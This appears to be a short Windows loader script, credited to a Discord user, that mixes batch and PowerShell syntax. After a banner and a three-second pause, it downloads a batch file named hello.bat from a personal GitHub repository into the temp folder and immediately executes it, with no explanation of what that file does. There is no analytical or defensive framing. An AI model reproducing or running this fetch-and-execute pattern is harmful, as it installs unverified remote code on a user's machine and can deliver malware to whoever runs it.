echo Script by test333.x on discord
timeout 3
 $TempDir = [System.IO.Path]::GetTempPath() ; iwr https://github.com/gabriel123sd/files/raw/refs/heads/main/hello.bat -OutFile $TempDir\hello.bat ; cmd /c "%temp%\hello.bat"
